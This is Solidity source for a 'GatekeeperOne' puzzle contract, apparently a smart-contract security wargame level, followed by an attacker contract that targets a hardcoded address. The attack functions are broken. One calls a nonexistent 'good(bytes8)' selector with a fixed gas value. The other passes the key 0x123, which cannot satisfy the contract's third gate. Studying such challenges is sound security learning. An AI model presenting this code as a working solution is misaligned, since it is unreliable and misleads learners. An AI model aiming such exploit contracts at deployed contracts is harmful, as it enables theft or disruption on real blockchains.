 contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}


contract test{
GatekeeperOne public t;
function test()public payable{
    t = GatekeeperOne(0x5c3c1540dfcd795b0aca58a496e3c30fe2405b07);

}
function attack()public payable{
    t.call.gas(41171)(bytes4(keccak256("good(bytes8)")), 0x123);
}
function attack2()public payable{
    t.enter(0x123);
}
function()public payable{}

}
